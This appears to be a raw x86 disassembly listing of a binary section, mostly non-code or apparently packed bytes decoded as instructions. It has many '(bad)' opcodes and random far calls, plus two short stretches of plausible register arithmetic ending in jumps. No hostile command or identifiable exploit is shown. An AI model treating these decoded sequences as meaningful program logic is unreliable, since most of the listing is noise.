  403b9a:	hlt    
  403b9b:	ss aad 0x16
  403b9e:	inc    edx
  403b9f:	push   ebp
  403ba0:	pushf  
  403ba1:	jle    0x403b8e
  403ba3:	push   ecx
  403ba4:	xchg   ebx,eax
  403ba5:	mov    esi,0x5e5565af
  403baa:	mov    DWORD PTR [esi],eax
  403bac:	cs sub ecx,edx
  403baf:	sub    eax,0x4ff276f3
  403bb5:	mov    esp,0x43dd462c
  403bba:	cld    
  403bbb:	pop    esi
  403bbc:	sar    BYTE PTR [edx],cl
  403bbe:	and    BYTE PTR [edx],ah
  403bc0:	mov    ch,0x8c
  403bc2:	mov    edi,0x7e549670
  403bc7:	inc    BYTE PTR [ebx-0x12c67d4e]
  403bcd:	aaa    
  403bce:	aad    0x3c
  403bd0:	mov    esi,0x8e0a81a5
  403bd5:	scas   eax,DWORD PTR es:[edi]
  403bd6:	xchg   esi,eax
  403bd7:	push   es
  403bd8:	stos   DWORD PTR es:[edi],eax
  403bd9:	inc    ebp
  403bda:	das    
  403bdb:	cmp    DWORD PTR [eax-0x27],esp
  403bde:	pop    ecx
  403bdf:	repz and BYTE PTR [ebx-0x19],dh
  403be3:	add    edi,DWORD PTR [eax]
  403be5:	or     BYTE PTR [ebx-0x5fd1d60b],0x58
  403bec:	and    BYTE PTR [ecx+0x1d],al
  403bef:	iret   
  403bf0:	scas   eax,DWORD PTR es:[edi]
  403bf1:	xor    BYTE PTR [ebx+0x6066c850],dh
  403bf7:	dec    eax
  403bf8:	cli    
  403bf9:	test   eax,0x4c6af1a0
  403bfe:	xchg   esp,eax
  403bff:	ja     0x403c50
  403c01:	and    BYTE PTR [esi],ch
  403c03:	jno    0x403c3a
  403c05:	sub    al,0xd4
  403c07:	sub    ebp,DWORD PTR [ebx]
  403c09:	mov    cl,0x1e
  403c0b:	dec    esp
  403c0c:	adc    bh,ah
  403c0e:	(bad)  
  403c0f:	xor    edi,eax
  403c11:	jno    0x403bdf
  403c13:	call   0xbff2:0x1d3cec1
  403c1a:	mov    ds:0x4e495719,al
  403c1f:	addr16 sub al,0xd8
  403c22:	adc    eax,0x1d8c81df
  403c27:	xchg   edx,eax
  403c28:	xor    dl,BYTE PTR [eax]
  403c2a:	das    
  403c2b:	fwait
  403c2c:	push   ss
  403c2d:	daa    
  403c2e:	sub    dh,BYTE PTR [edi+0x5cb808b2]
  403c34:	pop    ebp
  403c35:	retf   
  403c36:	stos   DWORD PTR es:[edi],eax
  403c37:	das    
  403c38:	arpl   bx,sp
  403c3a:	push   es
  403c3b:	cmp    al,0x43
  403c3d:	sbb    esi,DWORD PTR [ebp+esi*8+0x37]
  403c41:	div    DWORD PTR [eax-0x38374b57]
  403c47:	inc    eax
  403c48:	xchg   edi,ebx
  403c4a:	je     0x403c3e
  403c4c:	pop    ebx
  403c4d:	xchg   edi,eax
  403c4e:	test   DWORD PTR [ebx],edi
  403c50:	mov    esp,0x1ded3405
  403c55:	pop    eax
  403c56:	ret    0xec82
  403c59:	sar    DWORD PTR [edx],0x2b
  403c5c:	in     eax,dx
  403c5d:	cld    
  403c5e:	adc    eax,0xd4e120a3
  403c63:	pop    es
  403c64:	pop    ebp
  403c65:	inc    esi
  403c66:	mov    al,ds:0x282b9f13
  403c6b:	add    bl,BYTE PTR [ebp-0x21a180d1]
  403c71:	dec    esp
  403c72:	fisubr WORD PTR [ebp-0x46]
  403c75:	xchg   ebx,eax
  403c76:	inc    eax
  403c77:	sub    DWORD PTR [edi-0x7],edi
  403c7a:	enter  0x8198,0x93
  403c7e:	test   al,0xc0
  403c80:	cmp    DWORD PTR [ecx+0x44483361],ecx
  403c86:	sbb    eax,0x3fcba085
  403c8b:	(bad)
  403c8e:	xchg   BYTE PTR [edx],bl
  403c90:	xor    cl,0x1b
  403c93:	bound  edi,QWORD PTR [ecx-0x67]
  403c96:	sbb    BYTE PTR [eax-0x77d7e78b],0x2a
  403c9d:	push   ss
  403c9e:	mov    eax,ds:0x20c4e283
  403ca3:	jle    0x403c7b
  403ca5:	ds pop esi
  403ca7:	lea    ebx,[edx-0x54]
  403caa:	pop    ebx
  403cab:	sub    bh,BYTE PTR [esi-0x41]
  403cae:	cmp    ebp,DWORD PTR [ebx]
  403cb0:	(bad)  
  403cb2:	pop    ecx
  403cb3:	xor    BYTE PTR [ebp+0x22ad3794],dl
  403cb9:	int    0xdf
  403cbb:	hlt    
  403cbc:	in     eax,dx
  403cbd:	jo     0x403c8f
  403cbf:	rcr    BYTE PTR [esi],0x84
  403cc2:	or     DWORD PTR [eax],eax
  403cc4:	sub    al,0x63
  403cc6:	xchg   ecx,eax
  403cc7:	mov    edx,0x81a52f96
  403ccc:	dec    edx
  403ccd:	std    
  403cce:	mov    ds:0x289d9359,al
  403cd3:	mov    dh,0x87
  403cd5:	adc    bl,cl
  403cd7:	fdivp  st(7),st
  403cd9:	xchg   ecx,eax
  403cda:	ret    
  403cdb:	xor    ah,BYTE PTR [ecx]
  403cdd:	stos   BYTE PTR es:[edi],al
  403cde:	out    0xad,al
  403ce0:	adc    DWORD PTR [edi-0x243689a7],esi
  403ce6:	push   ebx
  403ce7:	dec    ecx
  403ce8:	ins    DWORD PTR es:[edi],dx
  403ce9:	dec    edx
  403cea:	scas   eax,DWORD PTR es:[edi]
  403ceb:	aad    0x79
  403ced:	test   al,0xb
  403cef:	push   ebp
  403cf0:	js     0x403cfc
  403cf2:	jne    0x403d4a
  403cf4:	mov    al,ds:0xd2a0a73d
  403cf9:	mov    edx,0xc63819dc
  403cfe:	das    
  403cff:	in     eax,dx
  403d00:	dec    ebx
  403d01:	mov    cl,0x19
  403d03:	or     eax,0x13f4aed5
  403d08:	dec    eax
  403d09:	aad    0x70
  403d0b:	jl     0x403cda
  403d0d:	int3   
  403d0e:	pusha  
  403d0f:	or     DWORD PTR [ebx-0x47],ecx
  403d12:	pop    edi
  403d13:	mov    ebx,0x675e706e
  403d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d19:	imul   esp,esp,0xd4d007a2
  403d1f:	test   al,0xa9
  403d21:	dec    esp
  403d22:	jp     0x403d0c
  403d24:	pop    ds
  403d25:	(bad)  
  403d26:	jecxz  0x403d9a
  403d28:	xor    ecx,ebx
  403d2a:	das    
  403d2b:	and    al,0x99
  403d2d:	push   0xffffffea
  403d2f:	jno    0x403ceb
  403d31:	aas    
  403d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d33:	retf   
  403d34:	push   ss
  403d35:	ret    0xb4c3
  403d38:	mov    edi,0x146449dc
  403d3d:	mov    BYTE PTR [eax-0x71792db1],dl
  403d43:	outs   dx,BYTE PTR ds:[esi]
  403d44:	inc    ecx
  403d45:	inc    DWORD PTR [edi]
  403d47:	inc    ebp
  403d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d49:	xchg   edx,eax
  403d4a:	lods   al,BYTE PTR ds:[esi]
  403d4b:	mov    edx,0xdcb8ba69
  403d50:	and    al,0xa0
  403d52:	ds add ah,al
  403d55:	repnz pop ebp
  403d57:	sahf   
  403d58:	sar    BYTE PTR [esi+0x2a39ddbe],cl
  403d5e:	and    ecx,DWORD PTR [edi-0x31]
  403d61:	nop
  403d62:	ss jb  0x403d1d
  403d65:	xor    al,0x1e
  403d67:	test   al,0x6b
  403d69:	xor    bh,BYTE PTR ds:0xc4cc449
  403d6f:	mov    dh,0xb8
  403d71:	adc    bh,bh
  403d73:	lds    edx,FWORD PTR [edi]
  403d75:	or     DWORD PTR [ecx-0x76efb6b7],eax
  403d7b:	or     bh,BYTE PTR [ebp+ebp*1+0x49]
  403d7f:	scas   al,BYTE PTR es:[edi]
  403d80:	adc    dl,cl
  403d82:	aam    0xb5
  403d84:	mov    al,ds:0x37f6f205
  403d89:	mov    ebx,0x42f73630
  403d8e:	inc    esp
  403d8f:	ja     0x403d70
  403d91:	mov    fs,WORD PTR [ecx+0x3a3d9ae7]
  403d97:	sbb    BYTE PTR [esi-0x72],0x57
  403d9b:	sar    DWORD PTR [ecx],1
  403d9d:	dec    esp
  403d9e:	in     eax,dx
  403d9f:	shr    ecx,0x66
  403da2:	in     eax,0x4e
  403da4:	pop    eax
  403da5:	loopne 0x403dee
  403da7:	adc    al,0x58
  403da9:	stos   BYTE PTR es:[edi],al
  403daa:	and    esi,DWORD PTR [esi-0x569f61c]
  403db0:	in     al,0xe0
  403db2:	mov    bh,BYTE PTR [edi-0x26236201]
  403db8:	adc    DWORD PTR [edx-0x40f6bae5],eax
  403dbe:	test   al,0xe3
  403dc0:	adc    BYTE PTR [edx+edi*8],ah
  403dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dc4:	in     al,dx
  403dc5:	test   BYTE PTR [eax+0x61470a3b],bh
  403dcb:	adc    BYTE PTR [esi],0xa6
  403dce:	push   edi
  403dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dd0:	or     DWORD PTR [ecx],esp
  403dd2:	adc    al,0x72
  403dd4:	mov    ds:0x76e020c6,eax
  403dd9:	aad    0xe3
  403ddb:	arpl   sp,dx
  403ddd:	call   0xb852de96
  403de2:	scas   eax,DWORD PTR es:[edi]
  403de3:	je     0x403dea
  403de5:	leave  
  403de6:	add    BYTE PTR [esp+esi*4-0x56b64e36],cl
  403ded:	pop    ss
  403dee:	repnz faddp st(2),st
  403df1:	sub    DWORD PTR [ecx-0x67],eax
  403df4:	mov    ds:0x37db79f5,eax
  403df9:	dec    ebp
  403dfa:	rol    DWORD PTR [ebx+0xf03d6ca],cl
  403e00:	jp     0x403e67
  403e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e03:	pcmpeqb mm7,QWORD PTR [eax+0x16]
  403e07:	ret    0xfb1
  403e0a:	pop    esi
  403e0b:	pop    edi
  403e0c:	(bad)  
  403e0d:	ins    DWORD PTR es:[edi],dx
  403e0e:	or     DWORD PTR [ecx-0x5835eb8b],esi
  403e14:	rol    BYTE PTR [edx+0x5c6594fa],1
  403e1a:	fwait
  403e1b:	push   0x13cdb4a9
  403e20:	sahf   
  403e21:	call   0xa8c2ecdd
  403e26:	les    edi,FWORD PTR [eax+0x113115d]
  403e2c:	mov    ?,WORD PTR [edx]
  403e2e:	xor    BYTE PTR [eax],0x6d
  403e31:	push   cs
  403e32:	xor    ah,al
  403e34:	test   eax,0x3e4b31a
  403e39:	sbb    eax,0x9be371d8
  403e3e:	xchg   edi,eax
  403e3f:	enter  0x2b4d,0xa9
  403e43:	and    esp,DWORD PTR ds:0x8818fad4
  403e49:	xor    eax,0x52a39c3b
  403e4e:	inc    ebp
  403e4f:	mov    ecx,es
  403e51:	cmc    
  403e52:	mov    WORD PTR [ecx],ds
  403e54:	mov    bh,0xc6
  403e56:	loop   0x403e94
  403e58:	sub    al,0xee
  403e5a:	inc    BYTE PTR [ecx]
  403e5c:	dec    edi
  403e5d:	dec    ebp
  403e5e:	sub    ah,BYTE PTR ds:0x62b02bb3
  403e64:	push   ds
  403e65:	imul   edi,DWORD PTR [ecx],0x2001b3c7
  403e6b:	jns    0x403e5a
  403e6d:	mov    BYTE PTR [esi],0x71
  403e70:	push   ss
  403e71:	sbb    ebx,DWORD PTR [eax-0x4]
  403e74:	(bad)  
  403e76:	inc    esi
  403e77:	sbb    ah,BYTE PTR [esi+0x49]
  403e7a:	xchg   DWORD PTR [ecx+esi*2+0x5a4a54ef],esp
  403e81:	lock dec eax
  403e83:	mov    cl,0xce
  403e85:	or     ebp,DWORD PTR [esi-0x55]
  403e88:	out    0x1b,al
  403e8a:	popa   
  403e8b:	push   eax
  403e8c:	xor    ebx,0xbb54c574
  403e92:	in     eax,dx
  403e93:	les    edi,FWORD PTR [ebx+eax*1]
  403e96:	xlat   BYTE PTR ds:[ebx]
  403e97:	or     al,0x1a
  403e99:	jge    0x403f0f
  403e9b:	ficom  DWORD PTR [ecx-0x52d6090a]
  403ea1:	(bad)  
  403ea2:	or     al,0xd8
  403ea4:	dec    esp
  403ea5:	icebp  
  403ea6:	jno    0x403ecd
  403ea8:	std    
  403ea9:	pop    eax
  403eaa:	push   edi
  403eab:	repnz xor BYTE PTR [ecx+0x75],dl
  403eaf:	out    0xe1,eax
  403eb1:	and    DWORD PTR [esi-0x34e2bdcc],0xffffffde
  403eb8:	mov    eax,ds:0x4f98942d
  403ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ebe:	adc    DWORD PTR [ecx-0x60],ebx
  403ec1:	shl    BYTE PTR ds:[esp+edi*4],0x30
  403ec6:	and    BYTE PTR [eax+0x62],cl
  403ec9:	inc    edi
  403eca:	out    0x8c,eax
  403ecc:	lock fwait
  403ece:	pop    es
  403ecf:	jno    0x403ea0
  403ed1:	aas    
  403ed2:	sub    esi,DWORD PTR [edi-0x59c6b70d]
  403ed8:	dec    edi
  403ed9:	lahf   
  403eda:	dec    edi
  403edb:	push   edi
  403edc:	cmp    eax,0x2b8e8bc3
  403ee1:	add    DWORD PTR [ecx-0x74],eax
  403ee4:	rol    BYTE PTR [ecx-0x7de2b3e8],0xc7
  403eeb:	dec    ebx
  403eec:	in     al,0x7f
  403eee:	ret    
  403eef:	adc    ebp,ebx
  403ef1:	mov    ch,0x3
  403ef3:	adc    dl,BYTE PTR [eax+0x5]
  403ef6:	in     al,dx
  403ef7:	mov    ah,0x28
  403ef9:	cmp    DWORD PTR [ebx+0x50],ebp
  403efc:	ffree  st(4)
  403efe:	std    
  403eff:	add    eax,esi
  403f01:	out    0x5e,eax
  403f03:	addr16 es into 
  403f06:	scas   eax,DWORD PTR es:[edi]
  403f07:	pop    ebp
  403f08:	sub    al,0xcc
  403f0a:	fld    DWORD PTR [ebx]
  403f0c:	add    DWORD PTR [ecx],ebx
  403f0e:	sbb    eax,0x42814f
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x4281cf
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x42835b,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x428217,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx-0x4cd6db44],ch
  403f58:	jl     0x403f28
  403f5a:	xlat   BYTE PTR ds:[ebx]
  403f5b:	sbb    BYTE PTR [eax],bl
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    BYTE PTR [edi-0x581f7de1],cl
  403f66:	xchg   ecx,eax
  403f67:	test   DWORD PTR [esi+0x37],0xb9a41d71
  403f6e:	mov    edi,DWORD PTR [edx-0x395f623]
  403f74:	xor    esp,DWORD PTR [edx-0x6c]
  403f77:	and    cl,BYTE PTR [ebx+eiz*8-0x45]
  403f7b:	cli    
  403f7c:	sbb    DWORD PTR [edi+eax*1-0x583efbef],0x3e52b207
  403f87:	ja     0x403fde
  403f89:	inc    eax
  403f8a:	retf   
  403f8b:	sub    ah,ah
  403f8d:	lods   al,BYTE PTR ds:[esi]
  403f8e:	inc    ebx
  403f8f:	mov    cl,BYTE PTR ss:[edx-0x6c48672d]
  403f96:	loope  0x403f3a
  403f98:	mov    cs,WORD PTR [esi]
  403f9a:	jge    0x403fa3
  403f9c:	les    ebp,FWORD PTR [eax-0x23e9e703]
  403fa2:	add    BYTE PTR [edi+0x518f5c13],ah
  403fa8:	mov    eax,0x8428f0e4
  403fad:	lods   al,BYTE PTR ds:[esi]
  403fae:	test   eax,0xab5a23b5
  403fb3:	mov    gs,WORD PTR [edi+0x3d]
  403fb6:	mov    edi,0xdca06579
  403fbb:	fistp  WORD PTR [eax+0x6d]
  403fbe:	push   ebx
  403fbf:	addps  xmm1,XMMWORD PTR ds:0x57234ff5
  403fc6:	and    al,0x73
  403fc8:	outs   dx,DWORD PTR es:[esi]
  403fca:	in     eax,dx
  403fcb:	imul   DWORD PTR [ebx-0x3e]
  403fce:	jg     0x403f9b
  403fd0:	xchg   ebx,eax
  403fd1:	out    dx,al
  403fd2:	xchg   dl,bh
  403fd4:	jmp    DWORD PTR [edx]
  403fd6:	xchg   edx,eax
  403fd7:	pop    es
  403fd8:	jle    0x404023
  403fda:	adc    al,0x5b
  403fdc:	arpl   WORD PTR [eax],bp
  403fde:	fsub   DWORD PTR [ebx-0x6ada27a5]
  403fe4:	fwait
  403fe5:	cdq    
  403fe6:	in     eax,0xe
  403fe8:	and    DWORD PTR [edx-0x12dfcbad],0xffffffac
  403fef:	push   0xffffffab
  403ff1:	ud2    
  403ff3:	jmp    0xa234:0x3862597
  403ffa:	pop    ss
  403ffb:	inc    edi
  403ffc:	sbb    BYTE PTR [eax+ecx*2],0x1d
  404000:	imul   esi,DWORD PTR [ebp+0x2d7622d2],0x81d049f3
  40400a:	aaa    
  40400b:	xchg   edx,eax
  40400c:	or     al,0xa0
  40400e:	fnsave [edi]
  404010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404011:	int3   
  404012:	cmp    al,0xf8
  404014:	shl    dl,1
  404016:	jne    0x404004
  404018:	bound  eax,QWORD PTR [edi+0x35e14148]
  40401e:	sbb    BYTE PTR [eax],0x4b
  404021:	cli    
  404022:	and    BYTE PTR [ebx+0xa1e64da],bl
  404028:	loopne 0x403fe5
  40402a:	mov    dh,0x61
  40402c:	ror    DWORD PTR [ebp-0x4f197e52],cl
  404032:	dec    eax
  404033:	ret    0xfe0c
  404036:	dec    esi
  404037:	out    dx,al
  404038:	in     eax,dx
  404039:	stc    
  40403a:	sbb    eax,0xed3458e4
  40403f:	pop    ecx
  404040:	rcr    DWORD PTR [esi-0x5855a12b],1
  404046:	leave  
  404047:	lahf   
  404048:	add    DWORD PTR [eax+0x6a041a1e],0xffffff81
  40404f:	inc    ebx
  404050:	xchg   edi,eax
  404051:	sub    ebx,DWORD PTR [ebx-0x1c4d3f13]
  404057:	add    bl,BYTE PTR [ecx+edx*1]
  40405a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40405b:	inc    ebx
  40405c:	into   
  40405d:	add    BYTE PTR [ebp-0x2e2670e5],al
  404063:	inc    ebx
  404064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404065:	add    BYTE PTR [esi],cl
  404067:	retf   0xcb1c
  40406a:	sbb    DWORD PTR [ecx+ebx*8+0x51865036],0xffffffd3
  404072:	loope  0x404018
  404074:	and    ecx,ebp
  404076:	jp     0x4040f6
  404078:	int    0xa4
  40407a:	cmp    dl,al
  40407c:	pop    edi
  40407d:	and    al,0x10
  40407f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404080:	mov    dh,al
  404082:	daa    
  404083:	retf   0xbfae
  404086:	mov    ah,0x85
  404088:	xchg   esp,eax
  404089:	cmp    eax,0x4492cc51
  40408e:	outs   dx,BYTE PTR ds:[esi]
  40408f:	mov    DWORD PTR [ecx+0x6e8501ec],ecx
  404095:	sbb    eax,0x42c94290
  40409a:	repnz iret 
  40409c:	xor    DWORD PTR [ebx-0x4e7d3f22],eax
  4040a2:	mov    bh,0x66
  4040a4:	call   0xf194:0x6332f238
  4040ab:	add    al,0xab
  4040ad:	jecxz  0x40407f
  4040af:	dec    ecx
  4040b0:	fadd   QWORD PTR [ebx]
  4040b2:	rol    BYTE PTR ds:0xc13bdb8b,cl
  4040b8:	add    DWORD PTR [esi-0x29aac311],esp
  4040be:	and    eax,DWORD PTR [eax+0x16]
  4040c1:	jl     0x40413d
  4040c3:	nop
  4040c4:	and    DWORD PTR [ebx+esi*1],0x44a7a8d1
  4040cb:	setl   BYTE PTR [edx+0x65]
  4040cf:	cmp    BYTE PTR ds:0x3404dd1f,al
  4040d5:	jb     0x404141
  4040d7:	jae    0x404079
  4040d9:	fistp  DWORD PTR [edi-0x4bf55366]
  4040df:	xchg   edi,eax
  4040e0:	fistp  WORD PTR ds:0x2dbfdc34
  4040e6:	in     al,dx
  4040e7:	(bad)  
  4040e8:	popa   
  4040e9:	je     0x40411a
  4040eb:	cmc    
  4040ec:	div    DWORD PTR ss:[ecx+0x5b8afa37]
  4040f3:	ficom  DWORD PTR [esi]
  4040f5:	cmp    DWORD PTR [ebx*4-0x5f651541],edx
  4040fc:	jg     0x4040a9
  4040fe:	(bad)  
  4040ff:	stos   BYTE PTR es:[edi],al
  404100:	sbb    ch,BYTE PTR [esi+0x79]
  404103:	xor    edi,eax
  404105:	jge    0x4040d0
  404107:	je     0x40411b
  404109:	mov    ch,0x41
  40410b:	cmp    DWORD PTR [ebp+0x1a],eax
  40410e:	xchg   BYTE PTR [esi-0x760630c4],dl
  404114:	or     ebx,DWORD PTR [eax]
  404116:	and    WORD PTR [edx],bx
  404119:	test   DWORD PTR [edx],0xb641778e
  40411f:	xor    eax,0xd6094826
  404124:	inc    ecx
  404125:	jnp    0x404184
  404127:	addr16 pop ds
  404129:	pop    ebx
  40412a:	dec    eax
  40412b:	rcl    BYTE PTR [ebp-0xc3711b8],0x9a
  404132:	rcl    BYTE PTR [edx-0x47a0614f],0x7c
  404139:	jbe    0x404184
  40413b:	int    0xa9
  40413d:	stos   BYTE PTR es:[edi],al
  40413e:	popf   
  40413f:	jle    0x4040ef
  404141:	and    eax,0x274f7d2f
  404146:	pop    ss
  404147:	fidiv  WORD PTR [ebp-0x635ae3bd]
  40414d:	and    ah,BYTE PTR [ebx-0x65]
  404150:	std    
  404151:	adc    al,0xb4
  404153:	pop    eax
  404154:	(bad)  [eax+0x74]
  404157:	jno    0x404178
  404159:	inc    ebx
  40415a:	mov    BYTE PTR [edi+ebp*1+0x3a],ah
  40415e:	mov    WORD PTR [ecx],gs
  404160:	div    DWORD PTR [ebp+0x9]
  404163:	sbb    BYTE PTR cs:[eax+0x55],0xc1
  404168:	fldenv [eax-0x354ca150]
  40416e:	cwde   
  40416f:	and    eax,0x34e3c9a
  404174:	push   es
  404175:	loopne 0x4041dc
  404177:	dec    ebx
  404178:	jae    0x4041b0
  40417a:	or     DWORD PTR [esi],edx
  40417c:	scas   eax,DWORD PTR es:[edi]
  40417d:	aam    0x27
  40417f:	jae    0x4041d9
  404181:	ret    0x21c7
  404184:	adc    esp,edi
  404186:	icebp  
  404187:	inc    eax
  404188:	sbb    edi,ecx
  40418a:	mov    dh,0x31
  40418c:	xchg   ecx,eax
  40418d:	dec    edi
  40418e:	jecxz  0x4041a7
  404190:	pop    edx
  404191:	fnstsw WORD PTR [edx+eax*1+0x19]
  404195:	mov    esi,0x4f529cb3
  40419a:	jo     0x404176
  40419c:	sub    eax,DWORD PTR [ecx-0x43]
  40419f:	ins    BYTE PTR es:[edi],dx
  4041a0:	push   ebx
  4041a1:	mov    ecx,?
  4041a3:	cli    
  4041a4:	cwde   
  4041a5:	test   al,0xdb
  4041a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041a8:	icebp  
  4041a9:	popf   
  4041aa:	xor    eax,0xd43fb8bf
  4041af:	fiadd  DWORD PTR [ebx+eiz*1-0x4d110bcf]
  4041b6:	xchg   esp,eax
  4041b7:	push   edx
  4041b8:	test   eax,0xda3322c2
  4041bd:	xchg   BYTE PTR [ebx-0x52],ah
  4041c0:	retf   
  4041c1:	call   0xddae:0xf57e8450
  4041c8:	pop    ds
  4041c9:	cmp    edx,DWORD PTR [ebp+0x34]
  4041cc:	aam    0x92
  4041ce:	mov    DWORD PTR [ebx+0x7a],ebp
  4041d1:	push   ebp
  4041d2:	not    al
  4041d4:	jb     0x40419f
  4041d6:	mov    ebp,0x3bf2317c
  4041db:	xchg   esp,eax
  4041dc:	inc    ecx
  4041dd:	cs in  al,0x1c
  4041e0:	aad    0x77
  4041e2:	cld    
  4041e3:	inc    ebx
  4041e4:	repnz add al,0x66
  4041e7:	dec    ebx
  4041e8:	in     eax,dx
  4041e9:	mov    eax,ds:0xcb6497a7
  4041ee:	jns    0x40420e
  4041f0:	or     BYTE PTR [ebp+0x33],dl
  4041f3:	sti    
  4041f4:	adc    BYTE PTR [ebx],cl
  4041f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041f8:	adc    dl,BYTE PTR [edi+ebp*8-0x64ae0879]
  4041ff:	test   eax,0xdceaa410
  404204:	cli    
  404205:	jge    0x4041a5
  404207:	shr    dl,cl
  404209:	div    BYTE PTR [ebp-0x364f679d]
  40420f:	mov    ds:0x18290aa6,eax
  404214:	bound  edi,QWORD PTR [ecx]
  404216:	out    dx,eax
  404217:	push   0x740b9e44
  40421c:	addr16 std 
  40421e:	adc    esp,DWORD PTR [esi+0x6e3da479]
  404224:	lea    ebx,[ecx]
  404226:	mov    eax,ds:0xddc7191f
  40422b:	sub    bl,BYTE PTR [eax-0x5474ad6d]
  404231:	aas    
  404232:	into   
  404233:	rcl    BYTE PTR [ebx-0x74],1
  404236:	dec    eax
  404237:	push   ss
  404238:	push   0x7955baf3
  40423d:	fwait
  40423e:	(bad)  
  40423f:	and    al,0x5c
  404241:	add    esp,ebx
  404243:	pop    ds
  404244:	loope  0x404293
  404246:	enter  0xb6ea,0x2c
  40424a:	loope  0x404200
  40424c:	mov    ch,0xe2
  40424e:	test   edi,edx
  404250:	call   0x29aa:0xddbde9d5
  404257:	mov    al,ds:0x46f4c487
  40425c:	push   ebx
  40425d:	arpl   dx,si
  40425f:	call   0x3fd79d97
  404264:	sub    BYTE PTR [edx-0x75],dl
  404267:	scas   al,BYTE PTR es:[edi]
  404268:	ret    0x5b8e
  40426b:	jns    0x40428e
  40426d:	pop    edi
  40426e:	daa    
  40426f:	in     eax,0x1d
  404271:	jmp    0x73dc:0xb0564016
  404278:	das    
  404279:	call   0x272a:0xaba86f2d
  404280:	push   0xf8cf706f
  404285:	aad    0xd9
  404287:	sub    al,0xb5
  404289:	jnp    0x404255
  40428b:	pcmpgtw mm7,QWORD PTR [edi-0x7a]
  40428f:	inc    ebp
  404290:	add    eax,edi
  404292:	out    dx,al
  404293:	imul   eax,DWORD PTR [ecx+0x2b38fed4],0xde775d59
  40429d:	repnz in eax,dx
  40429f:	cld    
  4042a0:	xor    DWORD PTR [edi-0x43],ebp
  4042a3:	mov    bh,0x3b
  4042a5:	stos   DWORD PTR es:[edi],eax
  4042a6:	jmp    0x68ae:0x5233d075
  4042ad:	mov    edi,0xeb6e4c54
  4042b2:	mov    al,ds:0x378a1a20
  4042b7:	or     DWORD PTR [edi],esi
  4042b9:	into   
  4042ba:	pop    esp
  4042bb:	xor    esi,esi
  4042bd:	retf   
  4042be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042bf:	sub    cl,ch
  4042c1:	push   eax
  4042c2:	mov    al,0x64
  4042c4:	scas   al,BYTE PTR es:[edi]
  4042c5:	in     eax,0x6f
  4042c7:	test   DWORD PTR [ebp-0x132fc919],0x4a163fc3
  4042d1:	xchg   DWORD PTR [esi-0x5a4c8a3f],esi
  4042d7:	test   DWORD PTR [eax+0x75b44c0d],edi
  4042dd:	enter  0xed09,0x42
  4042e1:	jno    0x4042e3
  4042e3:	pop    ecx
  4042e4:	sub    eax,0x53c03589
  4042e9:	mov    esi,0x5b7e27a3
  4042ee:	nop
  4042ef:	loop   0x404318
  4042f1:	shl    bh,cl
  4042f3:	dec    BYTE PTR [edx-0x3b]
  4042f6:	ins    BYTE PTR es:[edi],dx
  4042f7:	adc    eax,DWORD PTR [ebp+0x12]
  4042fa:	aas    
  4042fb:	inc    ebp
  4042fc:	in     al,dx
  4042fd:	dec    edi
  4042fe:	or     ecx,DWORD PTR [edi]
  404300:	in     eax,dx
  404301:	cmp    al,0x78
  404303:	and    eax,0x60c90daa
  404308:	int3   
  404309:	jmp    0x4e58e1b1
  40430e:	sbb    al,0x2f
  404310:	addr16 push 0xedafc8fe
  404316:	pop    eax
  404317:	pop    esi
  404318:	xchg   edx,eax
  404319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40431a:	leave  
  40431b:	or     eax,DWORD PTR [eax]
  40431d:	aas    
  40431e:	sbb    BYTE PTR [edi],bh
  404320:	add    BYTE PTR [edx-0x75],cl
  404323:	push   ebx
  404324:	add    al,0x21
  404326:	sbb    eax,0x42821b
  40432b:	xor    ecx,edi
  40432d:	or     edx,DWORD PTR ds:0x42824b
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x4282c7
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428207
  404344:	and    DWORD PTR ds:0x428367,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x42834f
  404355:	sbb    DWORD PTR ds:0x42825b,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	sahf   
  404370:	pop    esi
  404371:	xchg   DWORD PTR [ebp+edx*2-0x31],edi
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    BYTE PTR [edi+0x48],ah
  40437d:	xlat   BYTE PTR ds:[ebx]
  40437e:	ficomp WORD PTR [esi]
  404380:	add    BYTE PTR [ebp+0x40],0xad
